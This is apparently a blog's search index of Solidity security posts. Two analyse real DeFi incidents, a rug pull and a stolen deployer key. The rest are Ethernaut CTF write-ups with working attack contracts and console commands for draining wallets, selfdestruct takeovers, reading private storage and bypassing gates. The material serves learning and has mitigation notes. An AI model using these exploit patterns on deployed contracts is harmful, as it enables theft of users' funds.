[ { "title": "STABLEMAGNET SWAP - ANALYSIS OF A RUGPULL", "url": "/posts/STABLEMAGNET-RUGPULL/", "categories": "Blockchain, CTF-Writeups", "tags": "Ethereum, Solidity", "date": "2023-01-10 20:30:06 +0800", "snippet": " Around $22.2 (currently 27 and increasing) BUSD was rug pulled from StableMagnet Swaps liquidity pool on 23rd June 2021. This is an analysis of the exploit….Addresses Rug Pull Transaction : 0xf0ba46c8a20e1e75ad382e42c509bf71393e1b3b90326165c747a5d3cc5d967c StableMagnet Swap Contract: 0xb89e9365cb5bacfcf4a4b0386dfad45c3b4d3258 SwapUtils Library: 0xE25d05777BB4bD0FD0Ca1297C434e612803eaA9a BUSD sent to BNC: Txn’s Tether on EC: Txn’s Tether to DAI: Txn’sOverviewThe protocol orgs managed to rugpull 22.2 million dollarsThis is the tranasction that the intiated the rugpull which included 3 token transfres totaling to 22.2 million dollars worth.Following thw witdrawal all funds were split and transfereed to multiple wallets and converted to tether and finally converted to DAITransfer Of FundsThe following is the rough steps of the transactions that occurred:Exploit AnalysisSO as we can see the main exploit occured in an external call to the StableMagnet contract.This external call was to a library called SwapUtils which had a method which enabled the orgs to transfer all the liquidity to their own wallet.The attackers took advantage of the fact that the block explorers only verify the given contracts source code and not of the libraries which it may be importing this enabled them to have hidden functions as the code for this contract was not public.Not only did it have method to enable transfer of funds it also had the utility to keep extracting even more funds from the wallets of those users which had approved StableMagnet to deduct the set allownace in return for more tokens.PreventionThis rug pull highlights certain flaws..One we should never trust the verified check mark, it just verifies the code supplied to it and even if there is no use of external libraries in the code, verification is no guarentee towrds the safety of the code in the contract.This rug pull was an example of a hidden transfer which is not visible to the public but when executed transfers all the liquidity to the owners contract/wallet.Again this calls for stronger awareness on the part of investors especially in conducting at least a brief audit of the token into which they are investing or at least going thorugh the audit performed by a third party and to check if it seems legitimate and if all the issues mentioned have been confirmed with proof by the orgs that they have been fixed." }, { "title": "Ankr aBNBc Token Exploit", "url": "/posts/Ankr-aBNBc-Token-Exploit/", "categories": "Blockchain", "tags": "BSC, Token exploit, aBNBc", "date": "2023-01-07 20:30:06 +0800", "snippet": " OverviewOn 1st December 2022 Ankr’s BNB liquid staking token (aBNBc) was compromised and resulted in the hacker minting 60 trillion aBNBc which when compared to the liquidity resulted in an actul value of $5 million dollars.Addresses/Transactions:Attacker: 0xf3a465c9fa6663ff50794c698f600faa4b05c777Malicious Contract: 0xb2cb9e5311610c48aeed89e44549542362692808257f706accdc75f051ac7303Schnoodle Proxy: 0xcbc5ff4a6c9a66274f9bde424777c3dc862ab576e282fbea3c9c2609ca3e282bTransaction: 0xe367d05e7ff37eb6d0b7d763495f218740c979348d7a3b6d8e72d3b947c86e33(Compromised) Ankr deployer address: 0x2ffc59d32a524611bb891cab759112a51f9e33c0The AttackThe attack in itself was not complex involving some clever abuse of the Ankr tokens via a exploit rather it was classed as a simple social engeneering attack with the malicious actor managing to aquire the secret private key specifically the deployer private key enabling the attacker to essetially control the upgrade procedure and inject a custom contract with the ability to mint infinite tokens with zzero validation of the caller addres opening this fucntion to the general public resulting in random addresses minting tokens out of thin air.With the recent updates released by Ankr it has been disclosed it wasent even a typical social eng. attack rather it seems like a disgruntuled ex employee with access and knowledge of the upgrading process was able to compromise the system and steal the private key.The important thing to note here is this whole incident could have been avoided if the developers had taken heed of the advice given by the peckshield team which pointed out the consequences of having a single key controlling large amounts of authorisation making it a single point of faliure, but the said issue was marked as confirmed by Ankr which was clearly far from the truth. this is the report by peckshieldComing to why the attacker did what he did? It would be more surprising if someone had not done it!!! This attack is perfect example of complete neglegence on the part of developers, management, the administration and company policies in general.The attacker being an ex employee who is we could say with sufficient conviction not a big fan of the company saw the perfect opportunity of his positoin and inside knowledge of the company procedures and supposedly restricted information which should have been in the first place not known to someone who has been removed from the credit list of the comapny, with the result in the attacker completely compromising the system.Presented with such a scenerio it is hard to imagine some one not taking advantage of the situation. Anyone with knowledge of the codebase would have been aware of the fact that the protocol used single private key for validation rather than a multisig one. This issue was highlighted in the audit reports too which also would have been publicly accessible. Thus when the attacker got this information and odds are that he also knew the company had not resolved the issue (with the attackre being an insider essentially) all this was enough catalyst to set the attacker in motion.Coming to how such things can be prevented we analyse risk management from two aspects…….risk management platform for protocolsA risk management platform for such protocols would have to include preventive measures to tackle attacks and full comprmise of the system.Firstly It should keep track of al the audit issues highlighted in the various audits the protocol has undergone.These issues have to be verified that they have been addresesd to and have been rectified or otherwise been taken note of and not simply been marked as confirmed etc.This would be a publicly acessebile framework where the protocol users can clearly see the issues along with the proof of their confirmation in the case such proof is required to verify said claims. Thus ensuring companies dont take audits lightly.Another preventive method would be to avoid single points of faliure, the whole point of making an application on block chain is to make use of its dcentralised framework if after that the the entire control rests with a few central figures it is undermining the entire idea of a dex and a huge security flaw. Thus ensuring te use of multisig wallets for verifying important admin fucntion/ sensetive data.Ideally the majority of control should lie with protocol investers with ability to perform governance rather then the developers themselves.Another important prevention technique is strict access control of important and critical information and peridocally reviewing security policies and building robust access control software that invovles minimum manual oversight with good reliability and usability.Coming to metrics…Each transaction should be monitored via bots and limit must be set for the amount of money that can be deposited or withdrawn in a single transaction from the pool, this makes more sense when a particular exchange has been in use for a long time and has significant liquidity and users where if an atacker was to compromise the security they should not be able to drain the entirety of the funds in a single transaction.At the very least if no limit is set a system should be set in place to notify/warn the important / necessary people in the organization on the account a huge transaction has taken place involving the dex. this would enable the leadership to become aware of potential hacks in the system.Keeping analytics regardingb the user base is another important metric. This includes transaction information such as other defi platforms from where incoming transaction orginate or the destination of outgoing transactions. This would allow to monitor those platforms for potetial hacks which could have a residual effect on your platform.risk management platform for investorsInformation describing risks associated with TradingThe basic step towards risk management is to have a solid trading plan and the platform should have resources/information that help traders understand the risk of impulsive trading.limiting risk per tradeThe platform should have ways to track and identify new users and their level of experience to be able to impose certain trade restrictions on them initially so that they dont end up risking too much and or getting scammed.Impermanant lossThe platform should analyse and evaluate the ip loss for each open position and warn the user if it exceeds a certain pre defined limit.Limit use of exessive leverageAs you are spending borrowed money not your own money it is easy to get carried away and allthough rewards wouls prfit a lot the risk of loosing out is large.Measuring unique addresses growth rateOn any platform a positive growth in the number of unique addresees signifies the reach and popularity as well as the trust people have on a certain project, this helps in bringing prospective new users and increases trust in the system.Transaction monitoringAlerting users on influx of a lare amount of liquidity or rapid withdrawals which can be indictive of some hack or malicious actions.Keeping track of the M-cap (price-scale ratio)measures what a company is worth on the open market and the market’s perception of its future prospects. Thus, market capitalization is a simple, yet effective measure of how valuable a particular company or an industry is.Keeping track of inflation rateit is important to look at the token’s increase in supply and inflation rate. Tokens with a tendency to demonstrate high inflation rates in the past may be best to avoid." }, { "title": "Bad Proxies", "url": "/posts/Bad-Proxies/", "categories": "Blockchain, CTF-Writeups", "tags": "Ethereum, Solidity", "date": "2022-11-06 20:30:06 +0800", "snippet": " MotorbikeOverviewThis challenge requires some pre requisites regarding upgradable smart contracts and differentmethods used to achieve this.This challenge is based on the uups (Universal Upgradeable Proxy Standard) upgradeable pattern in this instead of the proxy contract containing the upgradable logic the implementaion contract itself has the upgrading logic coded into it.Another unique feature of this pattern is the security it provides agains storage collision. To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is typically saved in a specific storage slot (for example 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc) guaranteed to be never allocated by a compiler.We can see this defined in the challenge contract. In our case the proxy contract is the Motorbike contract and the Engine contract is the implementation contract.Now our goal is basically to call selfdestruct() on the implementation thereby making the proxy unusable.Analysing ContractsNow lets have a lok at the implementaion contract…Enginecontract Engine is Initializable { // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot { address value; } function initialize() external initializer { horsePower = 1000; upgrader = msg.sender; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable { _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); } // Restrict to upgrader role function _authorizeUpgrade() internal view { require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal { // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &amp;gt; 0) { (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private { require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly { r_slot := _IMPLEMENTATION_SLOT } r.value = newImplementation; }}This contract has no way to call the selfdestruct() function in it.In order to call it we will have to declare our own implementaion with the function declared in it.To do that we will need to update the implementation contract to ours. Looking at Engine we can see there is a fucntion to do just that: upgradeToAndCall().This function calls the ` _authorizeUpgrade()` function inside it which chekcs to see if we have the necessary authentication to change implementation contracts address. Only if we are the upgrader can we change the address.So how is the upgrader address determined..? The address which calls the initialize() function becomes the upgrader , this is meant to be called by the proxy contract.Lets have a look at the proxy contract….Motorbikecontract Motorbike { // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot { address value; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public { require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); } // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) { assembly { r_slot := slot } }}Here we can see that proxy contract indeed calls the initialize function and as we knoe the intilaize function can only be called once.So if are to become the upgrader we would have to somehow call the intialize() function and it should be the first time its being called.So how do we go about this…Constructing the exploitWhat we need to understand here is that The intialize() function has no access control and anyone is free to call it as long as two things are satisfied.. We need the address of the current implementaion contract so that we can call intialize() on it. We should be the first one to call intialize() The first problem to get the address, we know the address is stored at the above mentioned storage location so we just input the following query into the console..await web3.eth.getStorageAt(contract.address, &#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#39;)Now regarding the second problem, the proxy contract would have already called the initialize() function when it was deployed so how that means its been already called and we cant call it now ryt…?Well looking closely at the Mototrbike contract we see that its constructor performs a delegatecall on Engine to call intialize()this means that what ever storage variable change it changes in the context of the proxy contract and not that of the implementaion, including the variable which keeps track of if intialze() has been called or not.So in the context of Engine intialize() has never been called and so a simple call to it from our Attack contract will make our contract the upgrader and then we just need to load the address of our custom implementation contract containing the selfdestruct() fucntion, which we can then call.ExploitWe will need two contracts..Custom Implementation contract..contract SelfDestruct { function exploit() external{ selfdestruct(address(0)) }The exploit contract…// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Attack{ Engine engine = Engine(_EngineAddress); function upgrade() external{ engineAddress.initialize(); bytes memory encodedData = abi.encodeWithSignature(&quot;exploit()&quot;); engineAddress.upgradeToAndCall(_selfDestrucAddress, encodedData); }}Mitigation Make sure to guard sensetive and application critical function with access modifiers. Always be mindfull of the context in which a fucntion is being called and where the state variables are stored and modified." }, { "title": "How Not To Use Custom Errors", "url": "/posts/How-Not-To-Use-Custom-Errors/", "categories": "Blockchain, CTF-Writeups", "tags": "Ethereum, Solidity", "date": "2022-11-06 20:30:06 +0800", "snippet": " Good SamaritanOverviewThis challenge focuses on a relatively new feature introduced recently in solidity known as custom errors used for better error handling. The challenge is comprised of 3 smart contracts GoodSamaritan Coin WalletGoodSamaritian is the main contract we ned to exploit. It holds a million token intially and gives out 10 tokens to anyone who requests it, our goal is to drain the contract of all of its token.Lets have a look at the this contract…GoodSamaritiancontract GoodSamaritan { Wallet public wallet; Coin public coin; constructor() { wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); } function requestDonation() external returns(bool enoughBalance){ // donate 10 coins to requester try wallet.donate10(msg.sender) { return true; } catch (bytes memory err) { if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) { // send the coins left wallet.transferRemainder(msg.sender); return false; } } }}The constructor sets the wallet and coin contract deposits the tokens into the wallet.The requestDonation() function calls a function in the wallet contract which transfers the requester 10 tokens but we see that if the error regarding balances is encounterd the wallet transfers all of its funds present in it. This is what we ned to execute to drain the walet of al tokens.Lets have look at coin and then wallet contracts…Coincontract Coin { using Address for address; mapping(address =&amp;gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) { // one million coins for Good Samaritan initially balances[wallet_] = 10**6; } function transfer(address dest_, uint256 amount_) external { uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &amp;lt;= currentBalance) { balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) { // notify contract INotifyable(dest_).notify(amount_); } } else { revert InsufficientBalance(currentBalance, amount_); } }}The constructor intializes the wallet with 1 million coins and we can see that the contract defines a custom error called InsufficientBalance().The transfer function is intresting, allthough it performs the standard addition and subtraction classic of any normal transfer function the next part is whats out of ordinary as it sends out a notification to the contract that amount money has been transferred.This opens an attack vector for us as if we request via a contract it will pass dest_.isContract() check if we define a notify() function in our contract that will be called inside which we can take over control flow.Now looking at wallet contract…Walletcontract Wallet { // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() { if(msg.sender != owner) { revert OnlyOwner(); } _; } constructor() { owner = msg.sender; } function donate10(address dest_) external onlyOwner { // check balance left if (coin.balances(address(this)) &amp;lt; 10) { revert NotEnoughBalance(); } else { // donate 10 coins coin.transfer(dest_, 10); } } function transferRemainder(address dest_) external onlyOwner { // transfer balance left coin.transfer(dest_, coin.balances(address(this))); } function setCoin(Coin coin_) external onlyOwner { coin = coin_; }}This contract defines the donate10() function which checks if the wallet has enough balance else it reverts with the error NotEnoughBalance() this is the erro we need to execute to trigger the trasferRemainder() function declared in this contract which trnasfers all remaing wallet fund to the _dest address.Also note both donate10() and transferRemainder() fucntions are guarded by the onlyOwner() modifer hence only the contract owner in this case the GoodSamaritian can call them.Constructing the exploitOk now all the contracts have been analyzed this gives us an idea on how to proceed further… First we need to request the GoodSamaritian contract, this will execute the requestDonation() function. This in turn calls the donate10() fucntion which checks for balance and as at this time the wallet will have enough balance it will pass the check. Next the transfer() fucntion will be called in Coin contract, this will transfer 10 coins to our contracts address but then the notify() fucntion will be called on our contract. We should have the notify() function defined in our contract and inside this we will exceute the revert with the error NotEnoughBalance(). This revert will then trigger the catch expression in requestDonation() with the error message as NotEnoughBalance(). This will pass the check for the custom error and finally the transferRemainder() function wil be called and all wallet funds will be transferred to our contract.ExploitThis will be the final exploit…// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Attack{ error NotEnoughBalance(); GoodSamaritan goodsamaritan = GoodSamaritan(_GoodSamaritianAddress); //ethernaut instance address function exploitGoodSamaritian() external { goodsamaritan.requestDonation(); } function notify(uint256 amount) external pure { if (amount &amp;lt;= 10) { revert NotEnoughBalance(); } }}This contract is the attack contract. First we will call the exploitGoodSamaritian() function which will call the requestDoantion() function and as this is the first time all checks pass and 10 coins will be trnasferrred and the notif() function will be called. Insdie notify we have declared the revert statement with desired error which will trigger the tranferRemnainder() function to be called. But one catch is while transferring the entire wallet funds again the same process happens and again notify() will be called this willl result in our transfer being repeatedly reverted. To counter that the check is put: amount &amp;lt;= 10, so that when the entire amount is transferred the revert statement is not executed.MitigationIn order to avoid this instead of notifying in that manner maybe events can be used, the essential thing is not to give away control flow to an external party and then deciding critical (or for that manner any) contract functionality based upon any parameter that the external party could potentially tamper with." }, { "title": "Ethernaut CTF Writeups - Part 2", "url": "/posts/Ethernaut-CTF-Writeups-Part-2/", "categories": "Blockchain, CTF-Writeups", "tags": "Ethereum, Solidity", "date": "2022-10-04 20:30:06 +0800", "snippet": " Continuing from where we left of……___Level 7 [Force]This challenge appraises on a certain unconventional way of sending ether to a contract.To send ether as we normally do via transfer(), send() or call() to any contract we need it to be able to receive it via a function declared as payable.But what if such a function is not present or in general are there any other ways to send ether to contracts otherthan the once mentioned above?… Turns out there are certain unconventional methods we can use to send ether to contracts or for that matter any valid ethereum address even if that address is not yet created or in use.There are currently 3 ways to send ether to contracts/addreses even if they have no feature to receive ether: Via block rewards: If miner earns ether via sucessfull proof of work then the miner would receive a block reward and the miner can specify to which address this reward should be sent. Sending to a Pre-calculated address: As in the ethereum ecosystem calculating address is a deterministic process it is possible to easily calculate the address that would be assigned to a contract even before it is deployed thus if ether is send to that account beforehand than itwill have a non zro amount of eher on contract creation. Self Destruct: This is the most common one and includes calling the sucide opcode which will result in self destruct of entire contract code and its storageand all ether present in the contract will be sent to the specified address in the selfdestruct() function. // SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m)*/}As we can see the easiest way is to send ether to this contract via selfdestruc().All we need is a contract to which we need to send some ether and then call selfdestruct(target_address)// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Exploit{ constructor () public payable { selfdestruct(instanceAddress); }}Level 8 [Vault]This challenge enlightens us to a fundamental property of blockchain in general that is everything is publicly available unlike a normal codebase.Everything from contract code timstamps to contracts storage is visible to everyone in the blockchain system. Hence care should be taken to never disclose sensitive information in smart contracts.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }}So as we can see in the contract to pass this level we need to set the locked variable to false. It can be done by calling the unlock function but there is a check inside it to see if we provided the correct pasword only then will it set locked to false.If we look at the declaration of password we notice it is set to private but then again this is all in the block chain and just because a variable is set to private doesent mean we cant read its value.Private keyword only makes the variable safe from inheritance from other contracts and external contracts cant read the variable also unlike public variable which get a public getter function private variables dont have this.But after all this when it comes to accessing the storage manually via a block explorer there is no difference in if the variable is public or private since all variables storage can be accessed easily.So all we need to do is read the sorage slot where this variable is stored which in this case is slot 1.password = await web3.eth.getStorageAt(instance, 1)Level 9 [King]This challenge brings to light the pull over push pattern thats should be followed whenever ether needs to be transferred.It aims at shifting the risk associated with transferring ether to the user.Sending ether to another address in Ethereum involves a call to the receiving entity. There are several reasons why this external call could fail. If the receiving address is a contract, it could have a fallback function implemented that simply throws an exception, once it gets called. Another reason for failure is running out of gas. Thus its always better to have the user call a withdraw() function rather than the contract transferring it itself.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &amp;gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }}In this contract our goal is to block the contract from making anyone else king even if they send more ether than the current kings ether which is the check defined in the contract.To this we need to just make sure the contract is never able to execute line 19 in whcih it assigns the new king. Also we notice that the contract is not following the pull over push pattern thus we can easily stop code execution when the contract transfers ether to a contract we specify.All we need to do is declare a fallback fucntion in our contract which reverts eeverytime the contract reveives ether thus blocking the contracts code execution.Level 11 [Elevator]This is just a starightforward challenge and more about just writing the correct contract code so that it passes the checks.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building { function isLastFloor(uint) external returns (bool);}contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } }}So here the goal is to make the top variable to true. As we see the goto() fucntion is calling an external contract which implements a method called isLastFloor() and it takes one parameter.On the first call to isLastfloor() it should return false to pass the check with the parameter _floor and once the check is cleared the same function should return true on calling it for a second time with the same parameter.The following is the code of the Building contract which achieves that:// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Elevator { function goTo(uint _floor) external;}contract Building { bool private check = false; function isLastFloor(uint floor) external returns (bool) { if (check) { return true; } else { check = true; return false; } } function start(address elevatorInstance) public { Elevator elevator = Elevator(elevatorInstance); elevator.goTo(10); }}Level 12 [Privacy]This challenge familiarizes us with storage methods in solidity and how packing is done by the compiler to optimize storage space.Each storage slot in solidity is of 32 bytes and storage occurs in a sequential way where the slot starts from 0 and variables can be grouped together if enough space is still available in a particular slot this is known as packing. Packing can be done only in case of statically-sized variable i.e complex types like mapping and dynamic sized arrays are always stored begining from a new slot and cannot be packed.Below is the challenge contract:// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^` .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*., *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^ ,---/V\\ `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*. ~|__(o.o) ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39; UU UU */}Now lets analyze the storage structure of the given contract. bool public locked = true; // stored in slot 0 [1 byte] uint256 public ID = block.timestamp; // stored in slot 1 (complex type) [32 bytes] uint8 private flattening = 10; // stored in slot 2 [1 byte] uint8 private denomination = 255; // stored in slot 2 [1 byte] goes into slot 2 due to packing uint16 private awkwardness = uint16(now); // stored in slot 2 [2 bytes] goes into slot 2 due to packing bytes32[3] private data; // occupies slots 3,4,5 and 6 (complex type) [4x32 bytes] as complex type it starts from a new slotNow on line 17 we can see that function unlock() takes in a key as a parameter and that key is checked with the first 16 bytes of the value stored in the 3rd storage variable of the data array.Looking at the analysis of the storage pattern of this contract we see that data[2] will be stored in the 5th slot so all we need to do is read that memory slot and take the first 16 bytes and pass it to the unlock() function to pass this level.Level 13 [Gatekeeper One]As the name suggests this challenges consists of 3 gates which we need to pass in order to solve it. Each gate is a require statement enclosed in a modifier.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; }}gateOne modifier gateOne() { require(msg.sender != tx.origin); _; }This is the first gate and as we can see the check is similar to the Telephone challenge we did where we use another contract to act as intermediary.gateTwo modifier gateTwo() { require(gasleft().mod(8191) == 0); _; }This statement checks if the gas left modulo 8191 is equal to 0 i.e if 8191 divides the gas left this can achieved by simple brute force passing different values of gas until the check passes.gateThree modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; }This modifer has 3 seperate checks all based on conversion between different uint types:The way uint conversion works is when you convert a uint from higher uint to a lower one the first x bits of the original uint value will be taken when converting from uint to uintx i.e when converting uint64 to uint32 the first 32 bits of the vaiable will be taken. check one: modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); this checks matches the lower 32 bits with lower 16 bits of _gatekey to get them to be equal we can make bits $16-31$ of _gateKey as 0. check two: require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); Here the lower 32 bits is checked with the 64 bits of _gateKey and as they should not be equal i.e the upper 32 bits of _gateKey should not be 0. We see in a way this is kinda the opposite of the first check. check three: quire(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;); This check is easy enough to pass all we need to do is ensure when we make the _gatKey its lower 16 bits are equal to lower 16 bits of the transaction address. in the end consolidating all these we need _gateKey which is 64 bits whose first 16 bits are equal to that of tx.origin next 16 bits are 0 next 32 bits shouldnot be 0Level 14 [GateKeeper Two]Similar to the above challenge this also requires us to pass 3 gates.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; }}gate One modifier gateOne() { require(msg.sender != tx.origin); _; }This is similar to last challenge and the Telephone challenge.gate Two modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; }This gate checks if the address calling the function on which this modifier is used is smart contract or not. The way it does this is by making use of the extcodesize opcode which returns the length of the code present if any given an address. thus if smart contract is present at that address it will return a number greater than 0 and the check will fail. But since to pass the first check we will need to use a smartcontract.To bypass this we can call this contract from the constructor of our custom made smart contract. What this will do is fool the extcodesize opcode as during constrctor intilization the runtime bytecode has not yet been generated and hence the compiler doesnt know the size of the code present in the contract thus it will be 0 at this time. Hence allowing us to pass this check.gate Three modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; }This gate checks if the _gateKey is correct via a series of xor operations and at the end the xored result should satisfy a condition.But since we know all the variables other than _gateKey in this equation it is easy to recover it and pass the final check.___" }, { "title": "Ethernaut CTF Writeups - Part 1", "url": "/posts/Ethernaut-CTF-Writeups-Part-1/", "categories": "Blockchain, CTF-Writeups", "tags": "Ethereum, Solidity", "date": "2022-10-04 20:30:06 +0800", "snippet": " I recently started attempting Ethernaut CTF challenges and it has been a great learning experience solving all these variety of challenges which cover a broad spectrum of topics in solidity security and best practices and some coding tricks, gas reduction techniques etc. Every challenge brings forward a new topic and lot of the levels are connected too making it more easier to connect different bugs and their solutions.So this series of blog posts is just a way for me to document my findings for each challenge so that I can refer back to them if/when I forget in the future how I solved them or just want to look back at my methods at a later date.So lets dive into it…..Level 0 [Hello World]This is the introductory level where the entire level consistis of calling certain methods each pointing to another method name and at the end we need to authenticate with a password giving the password as a parameter to the authenticate() method. This level basically teaches us to use the console which is what we use to get the password which can be viewed through the password method. We get knowledge of the password method by viewing the list of contract objects via the console. The password comes out to be &quot;ethernaut0&quot;Below is the list of commands we need to enter into the console to complete the level:await contract.info()await contract.info1()await contract.info2()await contract.infonum()await contract.info42()await contract.theMethodname()await contract.method7123949()await contract.password()await contract.authenticate(&quot;ethernaut0&quot;)Level 1 [Fallback]This level as the name describes familiarizes us with the fallback function in solidity// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;contract Fallback { using SafeMath for uint256; mapping(address =&amp;gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function contribute() public payable { require(msg.value &amp;lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &amp;gt; contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { owner.transfer(address(this).balance); } receive() external payable { require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0); owner = msg.sender; }}As we can see there is a function called receive which when called sets the callers address as the owner of the contract. So our goal is to somehow make the contract execute this recieve function. Fallback functions in solidity are called when a contract gets called with ether passed along with the call and additionally some data may or may not be sent along. If the data field is not empty then the fallback() function is called else the recive() fucntion is called.Thus we just send over a message call to the contract keeping the data field empty thus resulting in the execution of the recieve function and making us the owner of the contract. Therafter its straight forward to drain the contract 